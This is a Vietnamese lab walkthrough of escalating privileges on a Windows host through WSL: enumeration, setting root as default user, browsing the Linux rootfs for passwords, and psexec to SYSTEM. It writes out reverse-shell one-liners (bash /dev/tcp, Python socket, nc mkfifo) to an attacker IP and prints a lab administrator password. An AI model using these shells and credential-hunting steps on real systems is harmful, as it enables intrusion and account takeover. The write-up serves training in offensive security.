# WSL là gì??

"WSL" là viết tắt của "Windows Subsystem for Linux," tức là Hệ thống con Windows cho Linux. Đây là một tính năng của hệ điều hành Windows, cụ thể là từ Windows 10 trở lên, cho phép người dùng chạy một hệ điều hành Linux trực tiếp trên Windows mà không cần cài đặt máy ảo hay khởi động lại hệ thống.

WSL cung cấp một môi trường thực thi Linux trên Windows, giúp người dùng có thể sử dụng các lệnh và ứng dụng Linux mà không cần cài đặt một hệ điều hành Linux riêng biệt. Điều này làm cho việc phát triển và chạy các ứng dụng có thể tương thích với cả hai hệ điều hành trở nên thuận tiện hơn.

Khi kích hoạt WSL, người dùng có thể chọn và cài đặt một bản phân phối Linux từ Windows Store (ví dụ như Ubuntu, Fedora, Debian). Sau đó, họ có thể mở một cửa sổ dòng lệnh Linux và thực hiện các tác vụ Linux mà không cần rời khỏi môi trường Windows.

# Liệt kê WSL trên máy Windows mục tiêu

Sau khi tìm ra cách khai thác web và vượt qua AV, tôi đã thu được một lớp vỏ đảo ngược với tư cách là người dùng Tyler.
![image-87](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/816a4730-c080-4a10-8851-7aa840a4d6ba)

## Phương pháp đếm thủ công

Khi nói đến việc liệt kê WSL trên hệ thống đích, tôi muốn bắt đầu bằng cách tìm thư mục Distros mặc định có tại C:\Distros .

![image-88](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/6fec4531-133e-4606-9de6-ab1d785c0829)

Trong C:\ tôi thực sự thấy hai gợi ý rằng WSL đã được cài đặt trên hệ thống này. Đầu tiên, chúng ta có thể thấy thư mục Distros mặc định, nhưng chúng ta cũng có thể thấy tệp ZIP cho ubuntu.
Bên trong thư mục Distros, tôi đang tìm kiếm tệp EXE cho một bản phân phối đã cài đặt, ví dụ: ubuntu.exe .

![image-89](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/18c6ce4d-95d5-4a97-ade4-cb66e8cc0854)

Nếu thư mục Distros mặc định không có trên hệ thống, chẳng hạn như nếu thư mục tùy chỉnh được sử dụng thay thế, thì chúng ta vẫn có thể liệt kê xem WSL có trên hệ thống hay không bằng cách kiểm tra hai tệp nhị phân: bash.exe và wsl.exe .

```
cmd.exe /c "cd C:\windows\system32 & dir /S /B bash.exe == wsl.exe"
```
![image-90](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d0bd16d5-1215-4742-9274-0661b67c3a4f)

Ở đây chúng ta thấy cả hai tập tin đều được tìm thấy trên hệ thống. Theo mặc định, wsl.exe sẽ có trên hầu hết các hệ điều hành Windows hiện đại, nhưng bash.exe thường chỉ được tìm thấy khi cài đặt WSL.
Để tìm xem wsl có “trực tuyến” hay không và thu thập danh sách các bản phân phối đang chạy, hãy sử dụng lệnh sau cho windows 10 1903 trở lên:

```
wsl --list --running
```

Ngoài ra, đối với các phiên bản Windows cũ hơn 1903, chúng ta có thể sử dụng lệnh sau để thay thế:

```
wslconfig /list
```
![image-91](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2e5fadb1-77c7-4a08-8c85-40ddd13bfbdd)

Kết quả đầu ra cho thấy có một bản phân phối đã đăng ký được cài đặt: Ubuntu – 18.04
Ngoài ra, tôi có thể tìm thấy thông tin này bằng winPEAS .

## Đếm tự động với winPEAS

winPEAS chạy quét liệt kê toàn bộ hệ thống. Hai công cụ bổ sung có thể được sử dụng để quét toàn bộ bảng liệt kê bao gồm: Seatbelt.exe và Jaws-enum.ps1
winPEAS là công cụ liệt kê tối ưu và cung cấp lượng thông tin LỚN. Nhiều đến mức có thể choáng ngợp; tuy nhiên, điều quan trọng là biết nơi để tìm thông tin nhất định.

Nói chung khi chạy winPEAS, chúng ta sẽ chạy nó không có tham số để chạy 'tất cả các kiểm tra' và sau đó xem xét tất cả các dòng đầu ra theo từng dòng, từ trên xuống dưới.

Tuy nhiên, trong trường hợp này, chúng ta không cần lo lắng về phần và phần phụ để tìm thông tin WSL vì nó sẽ nằm trong lần kiểm tra cuối cùng thứ hai: Interesting file and registry và luôn ở dưới cùng nếu nó tồn tại.
![image-95-1024x244](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0a8c5835-bdc6-4075-a8a8-fae78365f739)

Ở đây, chúng ta có thể thấy rằng PEAS đã tìm thấy WSL bằng cách kiểm tra bash.exe và wsl.exe (giống như chúng ta đã làm thủ công) và sau đó nó cũng tìm thấy thư mục gốc cho phiên bản WSL (điều này thực sự thú vị và chúng ta sẽ biết lý do tại sao sau). Cuối cùng, nó cung cấp lệnh để tôi chạy để thu thập thêm thông tin về bản phân phối.

Cuối cùng, có một điều thú vị mà chúng ta có thể làm với winPEAS, đó là thêm khóa chuyển -linpeas.sh=[URL] vào lệnh. Nếu tôi đặt URL tới máy tấn công của mình và cung cấp linpeas.sh, tôi có thể lấy nó và chạy trực tiếp trong phiên bản WSL. Điều này có thể hữu ích cho việc liệt kê các tệp thú vị hoặc để thử và bảo mật trong phiên bản nếu chúng ta chưa root.

Bây giờ chúng ta đã xác nhận rằng WSL đang chạy trên hệ thống, chúng ta có thể tương tác với nó bằng cách thực thi các lệnh Linux.

# Tương tác với WSL

Lệnh đầu tiên chúng ta muốn chạy là whoami để chúng ta có thể xem liệu chúng ta có đang chạy bằng root hay không. Có hai cách để chạy lệnh, sử dụng wsl.exe hoặc bash.exe .

```
wsl.exe "whoami"

bash.exe -c "whoami"
```
![image-94](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/867a9624-5a9d-4462-862d-26022c1e7c58)

Ở đây chúng ta có thể thấy rằng cả hai lệnh đều thực hiện cùng một công việc và chúng ta đã root bên trong bản phân phối Linux!
Nếu tôi nhận thấy rằng tôi không chạy bằng root, tôi có hai lựa chọn.
Đầu tiên, chúng ta có thể thử đặt người dùng mặc định thành root, việc này có thể được thực hiện bằng cách sử dụng lệnh sau:

```
C:\Distros\ubuntu.exe config --default-user root
```

Ở đây tôi sử dụng ubuntu.exe vì đó là tên của tệp thực thi distro mà tôi tìm thấy trong thư mục Distros. Điều này có thể thay đổi vì Ubuntu không phải là bản phân phối duy nhất có sẵn cho WSL.

Thứ hai, nếu điều đó không hiệu quả, chúng ta có thể lấy một shell đảo ngược trong phiên bản WSL với tư cách là người dùng chuẩn và sau đó cố gắng nâng cấp nội bộ lên root.

Root bên trong WSL không có nghĩa là máy đã được “root”. tôi muốn có quyền root để có toàn quyền truy cập vào các tệp trong hệ thống nhằm tìm kiếm những phát hiện thú vị.

Lấy Reverse Shell bên trong phiên bản WSL

Sau khi phát hiện ra rằng WSL đang chạy trên hệ thống và tôi có quyền truy cập bằng root, giờ đây tôi có thể tiến hành lấy một shell đảo ngược bên trong phiên bản ubuntu mà tôi thấy đang chạy.

Ví dụ, chúng ta có thể có được một shell đảo ngược trong WSL theo một số cách:
Sử dụng 1-liner với bash.exe:

```
bash.exe -c "bash -i >& /dev/tcp/10.10.16.7/443 0>&1"
```

Sử dụng 1-liner với wsl.exe :

```
wsl python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Hoặc có thể chúng ta có thể sử dụng PowerShell + netcat:

```
if([System.IO.File]::Exists("C:\Windows\System32\bash.exe")){bash.exe -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 443 >/tmp/f"}
```

Việc sử dụng bất kỳ phương pháp nào ở trên sẽ dẫn đến một trình bao đảo ngược bên trong phiên bản WSL.
![image-97](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/137cac8e-7cdf-4b16-b266-2159c16b8223)

NOTE: Điều này không giống như việc root mục tiêu thực tế. tôi thực sự quan tâm nhất đến việc tìm kiếm mật khẩu khi tôi đã có được shell trong phiên bản WSL. Điều này là do tôi đã root và tôi sẽ không thể làm gì nhiều trong phiên bản này ngoài việc liệt kê những phát hiện thú vị.

# No Shell No problem – Phương pháp thay thế để truy cập hệ thống tập tin

Vì mọi thứ trong Linux đều là một tệp nên chúng ta thực sự có thể duyệt qua hệ thống tệp trực tiếp trên mục tiêu Windows.

Các tệp cho một bản phân phối Linux nhất định sẽ được đặt trong hồ sơ trang chủ của chủ sở hữu WSL ở vị trí tệp sau: %userprofile%\AppData\Local\Packages .
Sử dụng lệnh sau, chúng ta có thể bắt đầu tìm thư mục gốc của Distro:

```
ls C:\Users\tyler\AppData\Local\Packages | findstr /v "Microsoft\. Windows\."
```
![image-98](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/6d371baf-a5ae-4355-b549-365a0adf3c8b)

Ở đây chúng ta có thể thấy một thư mục 'Ubuntu', vì vậy chúng ta có thể tiến hành kiểm tra xem có gì trong đó. tôi đang tìm kiếm một thư mục có tên LocalState - và tôi có thể thấy nó ở đây!
![image-99](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0764743f-b634-4350-adbc-c7af3ac26abd)

Và sau đó kiểm tra thư mục đó tiếp theo chúng ta tìm thấy rootfs , là thư mục gốc của hệ thống tập tin!
![image-100-1024x191](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/df04f9b3-2daf-4fbc-8474-6c940a129342)

Cuối cùng, vào thư mục rootfs , chúng ta có thể thấy rõ đây là hệ thống tập tin Linux.
![image-101-1024x457](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/281434b1-a3e8-473f-83b5-77c0870249bc)

# Liệt kê một phiên bản WSL cho các kết quả JUICY

Bây giờ tôi đã có toàn quyền truy cập vào hệ thống tệp Linux dưới dạng root, từ shell đảo ngược hoặc từ việc tìm thư mục trên máy chủ đích

Về cơ bản, điều tôi muốn làm là tìm kiếm mật khẩu – ít nhiều. Vì tôi đã root trong hệ thống Linux nên tôi có toàn quyền truy cập vào mọi tệp, bao gồm cả những vị trí phổ biến để tìm mật khẩu / hàm băm chẳng hạn như tệp shadow ; trong các tệp khác (webroot, tệp người dùng, v.v.); lịch sử bash; và nhiều hơn nữa!

Sau một số liệt kê thủ công (hoặc sử dụng linpeas.sh trong quá trình quét winpeas), chúng ta sẽ có thể tìm thấy một số tệp đáng để khám phá thêm. Ví dụ: giả sử tôi tìm thấy tệp .bash_history trong thư mục /root có một số byte trong đó, điều đó có nghĩa là nó chưa bị xóa.
![image-102](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/809ef278-905c-4f24-9f28-d64cd9140860)

Ta đã nhận được thông tin đăng nhập của quản trị viên cục bộ cho máy chủ Windows!
![image-103](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/018c400b-bafd-4455-bc1d-c9ed3df25315)

# Sử dụng những phát hiện để có được Shell HỆ THỐNG

Bây giờ chúng ta đã tìm thấy thông tin xác thực của quản trị viên cục bộ, chúng ta có thể có được shell theo một số cách trên máy chủ. Tuy nhiên, vì người ta nhận thấy rằng smbclient đã được sử dụng trong lịch sử bash, nên chúng ta hãy tiếp tục sử dụng dịch vụ đó (SMB) và lấy SYSTEM shell bằng cách sử dụng psexec.py từ Bộ công cụ Impacket .

```
psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
```
![image-104](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d696fa61-1e00-4653-99b6-b3beee59a4b9)
